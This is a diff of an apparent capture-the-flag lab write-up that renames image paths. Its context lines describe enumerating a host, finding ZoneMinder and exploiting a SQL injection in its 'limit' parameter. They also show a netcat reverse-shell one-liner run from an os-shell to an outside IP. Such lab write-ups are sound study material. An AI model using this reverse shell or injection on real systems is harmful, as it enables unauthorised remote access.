@@ -24,15 +24,15 @@ FTP doesn't allow for anonymous connections.
 
 Port 80 shows a login page:
 
-![](<../../../.gitbook/assets/image%20(495).png>)
+![](../../../.gitbook/assets/pebbles-4.png)
 
 Default creds don't work, so I ran a `gobuster` scan while moving on. Port 3305 shows a default Apache page:
 
-![](<../../../.gitbook/assets/image%20(496).png>)
+![](../../../.gitbook/assets/pebbles-5.png)
 
 Ran a `gobuster` scan on this too while enumerating port 8080, which had Tomcat.
 
-![](<../../../.gitbook/assets/image%20(3426).png>)
+![](../../../.gitbook/assets/pebbles-3.png)
 
 Again we have no credentials. The `gobuster` scan revealed there was ZoneMinder on both ports:
 
@@ -55,7 +55,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /zm                   (Status: 301) [Size: 320] [-> http://192.168.157.52/zm/]
 ```
 
-![](<../../../.gitbook/assets/image%20(1048).png>)
+![](../../../.gitbook/assets/pebbles-1.png)
 
 This version had an SQL Injection exploit:
 
@@ -111,4 +111,4 @@ This found the `limit` variable to be vulnerable to SQL Injection and I got a we
 os-shell> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.196 3305 >/tmp/f
 ```
 
-![](<../../../.gitbook/assets/image%20(2997).png>)
+![](../../../.gitbook/assets/pebbles-2.png)
